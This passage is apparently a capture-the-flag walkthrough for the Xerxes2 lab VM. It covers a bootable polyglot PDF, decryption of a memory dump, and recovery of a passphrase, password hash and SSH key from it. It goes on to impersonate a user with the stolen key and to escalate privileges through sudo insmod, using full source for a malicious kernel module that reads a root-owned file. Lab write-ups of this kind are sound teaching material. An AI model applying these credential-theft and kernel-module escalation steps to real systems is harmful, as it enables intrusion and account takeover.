 Type: 
 Referencing: 
 Contains stream

  <<
    /Length1 1462
    /Length2 9126
    /Length3 0
    /Length 10107
    /Filter /FlateDecode
  >>


obj 12 0
 Type: /FontDescriptor
 Referencing: 11 0 R

  <<
    /Type /FontDescriptor
    /FontName /WEGFEK+CMR10
    /Flags 4
    /FontBBox [-40 -250 1009 750]
    /Ascent 694
    /CapHeight 683
    /Descent -194
    /ItalicAngle 0
    /StemV 69
    /XHeight 431
    /CharSet (
    /R /b
    /comma /e
    /m /r)
    /FontFile 11 0 R
  >>


obj 13 0
 Type: 
 Referencing: 
 Contains stream

  <<
    /Length1 1858
    /Length2 11943
    /Length3 0
    /Length 13097
    /Filter /FlateDecode
  >>


obj 14 0
 Type: /FontDescriptor
 Referencing: 13 0 R

  <<
    /Type /FontDescriptor
    /FontName /ZTMOYO+CMTT10
    /Flags 4
    /FontBBox [-4 -233 537 696]
    /Ascent 611
    /CapHeight 611
    /Descent -222
    /ItalicAngle 0
    /StemV 69
    /XHeight 431
    /CharSet (
    /F /H
    /I /Y
    /a /b
    /c /comma
    /d /e
    /f /g
    /h /i
    /k /l
    /m /n
    /o /p
    /period /question
    /quoteright /r
    /s /slash
    /t /u
    /v /w
    /y )
    /FontFile 13 0 R
  >>


obj 6 0
 Type: /Font
 Referencing: 12 0 R, 9 0 R

  <<
    /Type /Font
    /Subtype /Type1
    /BaseFont /WEGFEK+CMR10
    /FontDescriptor 12 0 R
    /FirstChar 44
    /LastChar 114
    /Widths 9 0 R
  >>


obj 5 0
 Type: /Font
 Referencing: 14 0 R, 10 0 R

  <<
    /Type /Font
    /Subtype /Type1
    /BaseFont /ZTMOYO+CMTT10
    /FontDescriptor 14 0 R
    /FirstChar 39
    /LastChar 121
    /Widths 10 0 R
  >>


obj 7 0
 Type: /Pages
 Referencing: 3 0 R

  <<
    /Type /Pages
    /Count 1
    /Kids [3 0 R]
  >>


obj 15 0
 Type: /Catalog
 Referencing: 7 0 R

  <<
    /Type /Catalog
    /Pages 7 0 R
  >>


obj 16 0
 Type: 
 Referencing: 

  <<
    /Producer (pdfTeX-1.40.13)
    /Creator (TeX)
    /CreationDate "(D:20140605220405+02'00')"
    /ModDate "(D:20140605220405+02'00')"
    /Trapped /False
    /PTEX.Fullbanner (This is pdfTeX, Version 3.1415926-2.4-1.40.13 (TeX Live 2012
    /Debian ) kpathsea version 6.1.0)
  >>


xref

trailer
  <<
    /Size 17
    /Root 150R
    /Info 160R
    /ID [<F11EC07203BA4D86560A32F64766D9D3><F11EC07203BA4D86560A32F64766D9D3>]
  >>

startxref 26582

PDF Comment '%%EOF\n'

root@pwk:~# 

```


So, a couple of objects, 2 fonts and an image. The ID's of interest are 999, 1, and 8. pdf-parser can be used to extract objects, so I extracted them all. 1 and 4 resulted in nothing interesting, 8 resulted in a text file that read "foo", but 999 extracted as a file that looked like a PDF without headers.


``` bash

root@pwk:~# cat pdf999_b 
h?h??!Y??MZt
            ??????????U?u???????r?--WARNING--
   Unauthorized file access will be reported.
     XERXES wishes you
          a most productive dayhowhYXh
h7ihhzhOwh45h
@hgIh ,h#ohMZh

hNlhaWhFuhamh
 h: hishd horhswhash phheh
T??U?%PDF-1.5
%????
4 0 obj <<
/Length 292       
/Filter /FlateDecode
>>
stream
x?mQ?n?0
        ??+|+H#%I	?4?ڪu?M\?i
??? ??
      ????????Y?>E?? ?	??p,(?cJ??{e??"y????0MgqY_?#(s??M&e6??8?zm?A???????	M??q?--I?y?uZ^?Z???$?l??*c-tj?????v3ߴ~S?2>[5ZT9???g??M?aU_?????䟲??VY??=?n?S?h?r?H?s&`F?ry??ǆ??B/h?????mt?``?c?V?W??Ƨ?;??|?~ގ1??s5 ?????-9?0
root@pwk:~#

```


I used a hexeditor to add the PDF header and footer information


``` bash

00000000   83 E0 FF EB  1F 25 50 44  46 2D 31 2E  35 0A 68 E0  08 17 BC 00  10 68 C0 07  .....%PDF-1.5.h......h..
00000018   1F EB 21 59  81 F9 4D 5A  74 0C B4 0E  86 C1 CD 10  86 C5 CD 10  EB ED BE 55  ..!Y..MZt..............U
00000030   00 AC 75 02  EB FE B4 0E  CD 10 EB F5  EB 72 E9 2D  2D 57 41 52  4E 49 4E 47  ..u..........r.--WARNING
00000048   2D 2D 0A 20  20 20 55 6E  61 75 74 68  6F 72 69 7A  65 64 20 66  69 6C 65 20  --.   Unauthorized file
00000060   61 63 63 65  73 73 20 77  69 6C 6C 20  62 65 20 72  65 70 6F 72  74 65 64 2E  access will be reported.
00000078   0A 20 20 20  20 20 58 45  52 58 45 53  20 77 69 73  68 65 73 20  79 6F 75 0A  .     XERXES wishes you.
00000090   20 20 20 20  20 20 20 20  20 20 61 20  6D 6F 73 74  20 70 72 6F  64 75 63 74            a most product
000000A8   69 76 65 20  64 61 79 00  68 6F 77 68  59 58 68 0D  0A 68 37 69  68 68 7A 68  ive day.howhYXh..h7ihhzh
000000C0   4F 77 68 34  35 68 0A 40  68 67 49 68  20 2C 68 23  6F 68 4D 5A  68 0A 0A 68  Owh45h.@hgIh ,h#ohMZh..h
000000D8   4E 6C 68 61  57 68 46 75  68 61 6D 68  0A 20 68 3A  20 68 69 73  68 64 20 68  NlhaWhFuhamh. h: hishd h
000000F0   6F 72 68 73  77 68 61 73  68 20 70 68  68 65 68 0A  54 E9 17 FF  00 00 00 00  orhswhash phheh.T.......
00000108   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
00000120   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
00000138   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
00000150   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
00000168   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
00000180   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
00000198   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
000001B0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
000001C8   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ........................
000001E0   00 00 00 00  00 00 00 00  55 AA 25 50  44 46 2D 31  2E 35 0A 25  D0 D4 C5 D8  ........U.%PDF-1.5.%....
000001F8   0A 34 20 30  20 6F 62 6A  20 3C 3C 0A  2F 4C 65 6E  67 74 68 20  32 39 32 20  .4 0 obj <<./Length 292
00000210   20 20 20 20  20 20 0A 2F  46 69 6C 74  65 72 20 2F  46 6C 61 74  65 44 65 63        ./Filter /FlateDec
00000228   6F 64 65 0A  3E 3E 0A 73  74 72 65 61  6D 0A 78 DA  6D 51 C1 6E  83 30 0C BD  ode.>>.stream.x.mQ.n.0..
00000240   E7 2B 7C 2B  48 23 25 49  09 E1 34 A9  DA AA 75 B7  4D 5C A6 69  07 0A A1 A0  .+|+H#%I..4...u.M\.i....
00000258   15 C2 20 19  E2 EF 07 0B  91 B6 AA 8A  14 3F DB CF  EF 59 C9 3E  45 DB 03 89  .. ..........?...Y.>E...
00000270   20 C1 09 A7  1C D2 12 08  8D 70 2C 28  F0 98 63 4A  19 A4 05 BC  7B 07 65 DA   ........p,(..cJ....{.e.
00000288   C2 0F 22 1A  79 BA AA 07  8B F0 B6 30  4D 67 71 59  5F E4 9D 23  28 73 AE B4  ..".y......0MgqY_..#(s..
000002A0   4D 26 65 36  85 A3 38 89  7A 6D 9A 41  96 E6 82 FD  8F F4 19 42  08 88 C0 09  M&e6..8.zm.A.......B....
000002B8   4D AC E1 71  F3 2D 2D 49  B6 79 3F 75  5A 5E CD 5A  97 D5 F2 24  F3 6C 16 B3  M..q.--I.y?uZ^.Z...$.l..
000002D0   89 2A 1D 63  2D 74 6A 94  FD E0 8A 99  76 33 18 DF  B4 7E 53 C6  32 3E 5B 35  .*.c-tj.....v3...~S.2>[5
000002E8   5A 54 39 A0  95 8D 67 A9  AF 4D B2 61  18 55 5F AC  1B F5 F5 FC  04 F7 B7 E4  ZT9...g..M.a.U_.........
00000300   9F B2 AE 9B  56 59 D3 EA  BA 3D FF 6E  81 1E 53 F4  85 68 18 C2  72 96 48 92  ....VY...=.n..S..h..r.H.
00000318   18 73 26 60  17 46 98 72  01 79 83 B6  C7 86 C0 83  42 2F 68 BF  FC 9B F8 F3  .s&`.F.r.y......B/h.....
00000330   6D 74 97 60  1E 11 60 82  63 C6 56 AF  57 D9 C8 C6  A7 C2 3B F9  C1 7C CB 7E  mt.`..`.c.V.W.....;..|.~
00000348   DE 8E 31 E6  F5 73 35 20  DE FF 9E DB  E2 07 2D 39  89 30 0A 65  6E 64 73 74  ..1..s5 ......-9.0.endst
00000360   72 65 61 6D  0A 65 6E 64  6F 62 6A 20  25 25 45 4F  46 0A                     ream.endobj %%EOF.

```


I was then able to run this through pdf-parser again to get to object 4. Now, I wont show you that, what I will do is show you this conversation...


``` bash

9:34 AM <recrudesce> yeah
9:35 AM <recrudesce> oooh, interesting
9:35 AM <recrudesce> PDF Comment '%\xd0\xd4\xc5\xd8\n'
9:35 AM <recrudesce> dunno if that's just because of the way i've made the file
9:39 AM <recrudesce> root@pwk:~# pdf-parser -w out.pdf
9:39 AM <recrudesce> PDF Comment %PDF-1.5
9:39 AM <recrudesce> PDF Comment %????
9:39 AM <recrudesce> obj 4 0
9:39 AM <recrudesce>  Type:
9:39 AM <recrudesce>  Referencing:
9:39 AM <recrudesce>  Contains stream
9:39 AM <recrudesce>   <<
9:39 AM <recrudesce>     /Length 292
9:39 AM <recrudesce>     /Filter /FlateDecode
9:39 AM <recrudesce>   >>
9:39 AM <recrudesce> PDF Comment %%EOF
9:39 AM <recrudesce> so i can see the stream
9:39 AM <recrudesce> OH
9:39 AM <recrudesce> MY
9:39 AM <recrudesce> GOD
9:40 AM <recrudesce>  /F15 9.9626 Tf 125.782 676.223 Td [(Found)-525(this)-525(./dump)-525(file,)-525(thought)-525(you'd)-525(find)-525(it)-525(useful.)]TJ 0 -18.929 Td [(I've)-525(encrypted)-525(it)-525(though,)-525(because)-525(of)-525(the)-525(powers)-525(that)-525(be...)]TJ 0 -18.929 Td [(You)-525(know)-525(how)-525(to)-525(get)-525(the)-525(password,)-525(right?)]TJ 0 -18.929 Td [(Happy)-525(hunting.)]TJ
9:40 AM <recrudesce> 200 0 0 200 197.638 405.268 cm
9:40 AM <recrudesce> Q
9:40 AM <recrudesce> BT
9:40 AM <recrudesce> 200 0 0 200 197.638 405.268 cm
9:40 AM <recrudesce> Q
9:40 AM <recrudesce> BT
9:40 AM <recrudesce> ./F8 9.9626 Tf 249.651 386.339 Td [(Remem)28(b)-28(er,)-333(rem)-1(em)28(b)-28(er)]TJ
9:46 AM <superkojiman> :) 
9:46 AM <superkojiman> will play with it tonight. if i start ita t work i won’t get anything done
9:46 AM <recrudesce> i need to decode that file
9:46 AM <recrudesce> where is the qr code ?
9:47 AM <superkojiman> it's in the pdf.
9:47 AM <superkojiman> polito.pdf
9:49 AM <recrudesce> when i open that file i just get blank
9:49 AM <recrudesce> is it one of the streams ?
9:49 AM <recrudesce> ah, it'll be that 200x200 image
9:49 AM <recrudesce> which i've not been able to get yet
9:49 AM <superkojiman> weird.
9:49 AM <recrudesce> how did you extract it ?
9:49 AM <superkojiman> it just shows on mine. :-/
9:49 AM <recrudesce> the PDF for me is completely blank
9:49 AM <superkojiman> opened it up in kali
9:49 AM <superkojiman> really?
9:49 AM <recrudesce> i'll try again
9:51 AM <superkojiman> i'm using epdfview
9:51 AM <superkojiman> apt-get install epdfview
9:52 AM <recrudesce> wtf, it shows now
9:52 AM <superkojiman> :D
9:52 AM <recrudesce> so i just extracted all the text
9:52 AM <superkojiman> was wondering why you were getting all excited when you extracted that.
9:52 AM <superkojiman> i was like "but i see it right here..." :D
9:53 AM <recrudesce> i made that a lot more complicated than i needed
9:53 AM <recrudesce> feck

```


Turns out the PDF I had was corrupt, and that the actual PDF looks like this

[![xerxes2_006](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png)

![](http://img3.wikia.nocookie.net/__cb20130417220142/mlp/images/6/61/FANMADE_Derp_by_WorkingOrder.gif)

Well didn't I feel stupid ? The QR code decodes as "XERXES is watching...", so that's not of any use either. There's got to be something still hidden in this PDF that I'm not seeing.


``` bash

root@pwk:~# file polito.pdf 
polito.pdf: x86 boot sector, code offset 0xe0

```


Wait, wut ? A bootable PDF ?

![](http://www.reactiongifs.us/wp-content/uploads/2013/12/blinking_sword_in_the_stone.gif)

OK, so, how to I boot this PDF I wonder ? Well, turns out this technique has already been used by [PoC||GTFO with their 2nd edition](https://www.alchemistowl.org/pocorgtfo/pocorgtfo02.pdf) - check out section 8 to see instructions on using qemu. X11 forwarding required - luckily I set up X11 forwarding ages ago. Using the command found in PoC||GTFO002, I ended up with the following screen

[![xerxes2_007](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png)](http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png)

Nice, a password.  Lets get that dump file decrypted.


``` bash

polito@xerxes2:~$ gpg --output output.bin --decrypt dump.gpg
gpg: CAST5 encrypted data
Enter passphrase: amFuaWNl
pg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
polito@xerxes2:~$ ls -l output.bin
-rw-r--r-- 1 polito polito 132120576 Aug  8 11:55 output.bin

```


I am going to assume this is a memory dump, so I figured the first thing to do was to run strings on it - it scrolled text for ages... I need to be more defined.


``` bash

polito@xerxes2:~$ strings output.bin | grep korenchkin
korenchkin.tar.enc
cat /home/korenchkin/.ssh/id_rsa
/home/korenchkin/.ssh/id_rsa
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
1000      2905  0.0  1.1   9268  1480 ?        S    12:43   0:00 sshd: korenchkin@pts/0
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
_pammodutil_getpwnam_korenchkin_3
korenchkin
/home/korenchkin
/home/korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
cat /var/mail/korenchkin 
_pammodutil_getpwnam_korenchkin_2
korenchkin
_pammodutil_getpwnam_korenchkin_1
_pammodutil_getspnam_korenchkin_1
_pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
31 12:46:08 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
31 12:46:08 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
korenchkin
korenchkin:$6$WjgI1TzN$u8gOd9v8jR2ffDGWGOwtxc58yczo5fsZy40TM84pct.iSmlwRA4yV3.tdPnn5b8AWiQ.tnqUeInSQqkVEI2z3.:16221:0:99999:7:::
May 31 12:41:48 xerxes2 sshd[2749]: Accepted password for korenchkin from 172.16.32.1 port 33385 ssh2
May 31 12:41:48 xerxes2 sshd[2749]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
May 31 12:43:40 xerxes2 sshd[2903]: Accepted password for korenchkin from 172.16.32.1 port 33398 ssh2
May 31 12:43:40 xerxes2 sshd[2903]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
May 31 12:46:08 xerxes2 sshd[2506]: Accepted password for korenchkin from 172.16.32.1 port 33414 ssh2
May 31 12:46:08 xerxes2 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
ts/0korenchkin
korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
ts/0korenchkin
sshd: korenchkin [priv]
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
_pammodutil_getpwnam_korenchkin_0
sshd: korenchkin@pts/0
/home/korenchkin/.bash_history
sshd: korenchkin
sshd: korenchkin@pts/0
_pammodutil_getpwnam_korenchkin_0
cat /var/mail/korenchkin 
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
root: korenchkin
sshd: korenchkin@pts/0
korenchkin.l
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
korenchkin.lock
ome/korenchkin
cat /home/korenchkin/.ssh/id_rsa
/home/korenchkin/.ssh/id_rsa
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
sshd: korenchkin [priv]
_pammodutil_getpwnam_korenchkin_0
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
ts/0korenchkin
2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <root@xerxes2.trioptimum> R=local_user T=mail_spool
]0;korenchkin@x
korenchkin
korenchkin
korenchkin
korenchkin.lock
korenchkin
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
_pammodutil_getpwnam_korenchkin_1
_pammodutil_getspnam_korenchkin_1
_pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
tar -cvf /opt/backup/korenchkin.tar ~/
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
rm /opt/backup/korenchkin.tar
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
_pammodutil_getpwnam_korenchkin_2
korenchkin
sshd: korenchkin@pts/0
root: korenchkin
korenchkin.l
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
korenchkin.lock
korenchkin
korenchkin
/home/korenchkin
ts/0korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ n
_pammodutil_getpwnam_korenchkin_3
korenchkin
/home/korenchkin
korenchkin
/home/korenchkin
ts/0korenchkin
cat /var/mail/korenchkin 
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
/home/korenchkin0
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 6MMMMb\  6MMMMb  
]0;korenchkin@x
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
/home/korenchkin/.terminfo
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 6MMMMb\  6MMMMb  
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
USER=korenchkin
MAIL=/var/mail/korenchkin
PWD=/home/korenchkin
PWD=/home/korenchkin
HOME=/home/korenchkin
LOGNAME=korenchkin
/var/mail/korenchkin
USER=korenchkin
LOGNAME=korenchkin
HOME=/home/korenchkin
MAIL=/var/mail/korenchkin
korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 
HOME=/home/korenchkin
/var/mail/korenchkin
MAIL=/var/mail/korenchkin
korenchkin
/home/korenchkin
korenchkin
/home/korenchkin
korenchkin
USER=korenchkin
korenchkin
LOGNAME=korenchkin
/home/korenchkin
/home/korenchkin
/home/korenchkin
_pammodutil_getpwnam_korenchkin_1
_pammodutil_getspnam_korenchkin_1
_pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
polito@xerxes2:~$ 

```


That's more workable - but wait, what's that... a tarball encrypted into /opt/backup/ ?

![](http://1.bp.blogspot.com/_pS7sKjlzwFg/TOMG_De_jfI/AAAAAAAAGX4/XfN7NH07GiA/s320/quagmire_jackpot.gif)

OpenSSL can be used to decrypt the file to get the original tarball.


``` bash

polito@xerxes2:~$ openssl aes-256-cbc -d -salt -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out /home/polito/korenchkin/korenchkin.tar
polito@xerxes2:~$ ls -l korenchkin/
total 12
-rw-r--r-- 1 polito polito 10240 Aug  8 12:05 korenchkin.tar
polito@xerxes2:~$ cd korenchkin/
polito@xerxes2:~/korenchkin$ tar xvf korenchkin.tar 
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~/korenchkin$ 

```


Looks like Korenchkin is sensible and backs up his keypair... but now I have it, so user impersonation is possible.


``` bash

polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa korenchkin@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____   
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

You have new mail.
korenchkin@xerxes2:~$ id
uid=1000(korenchkin) gid=1000(korenchkin) groups=1000(korenchkin),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
korenchkin@xerxes2:~$ 

```


Once again, my public key is echo'd into .ssh/authorized_keys, and I am able to SSH in from my client.



* * *





## Holding the Con with Anatoly


![](http://img1.wikia.nocookie.net/__cb20120107145214/shodan/images/e/e1/Korenchkin.png)

With great power comes great responsibility.  This is [Anatoly Korenchkin](http://shodan.wikia.com/wiki/Anatoly_Korenchkin).

Korenchkin must be able to do some important stuff - after all he worked alongside the captain of the Von Braun. Turns out my suspicion was correct


``` bash

korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
korenchkin@xerxes2:~$  
```


Korenchkin can load and remove kernel modules as root without a password. This could be interesting as I have no idea about how kernel modules work. I started off compiling and loading a simple Hello World module from [TheGeekStuff](http://www.thegeekstuff.com/2013/07/write-linux-kernel-module/). It worked ! But can I make a malicious kernel module - possibly one that can read /root/flag.txt ? Yup, and here's the code to do it.

[c]
#include <linux/module.h>  // Needed by all modules
#include <linux/kernel.h>  // Needed for KERN_INFO
#include <linux/fs.h>      // Needed by filp
#include <asm/uaccess.h>   // Needed by segment descriptors

int init_module(void)
{
    // Create variables
    struct file *f;
    char buf[1024];
    mm_segment_t fs;
    int i;
    // Init the buffer with 0
    for(i=0;i<1024;i++)
        buf[i] = 0;
    // To see in /var/log/messages that the module is operating
    printk(KERN_INFO "My module is loaded\n");
    // I am using Fedora and for the test I have chosen following file
    // Obviously it is much smaller than the 128 bytes, but hell with it =)
    f = filp_open("/root/flag.txt", O_RDONLY, 0);
    if(f == NULL)
        printk(KERN_ALERT "filp_open error!!.\n");
    else{
        // Get current segment descriptor
        fs = get_fs();
        // Set segment descriptor associated to kernel space
        set_fs(get_ds());
        // Read the file
        f->f_op->read(f, buf, 1024, &f->f_pos);
        // Restore segment descriptor
        set_fs(fs);
        // See what we read from file
        printk(KERN_INFO "buf:%s\n",buf);
    }
    filp_close(f,NULL);
    return 0;
}

void cleanup_module(void)
{
    printk(KERN_INFO "My module is unloaded\n");
}

```


I realised I needed a Makefile as well, so I knocked one of those up quickly (nothing complicated)

[plain]
obj-m += flag.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```


With the source code and the Makefile, I then compiled the kernel module and loaded it


``` bash

korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/kernel/kernel2/kernel3/kernel4 modules
make: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.o
/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c: In function ‘init_module’:
/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c:37:1: warning: the frame size of 1028 bytes is larger than 1024 bytes [-Wframe-larger-than=]
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.mod.o
  LD [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.ko
make: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'
You have new mail in /var/mail/korenchkin
korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ sudo insmod flag2.ko
korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ dmesg | tail -20
[113593.419616] `MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
[113593.419617]  `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
[113593.419618]   `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
[113593.419619]    `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
[113593.419619]    d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
[113593.419620]   d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
[113593.419621] _d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 
[113593.419622] 
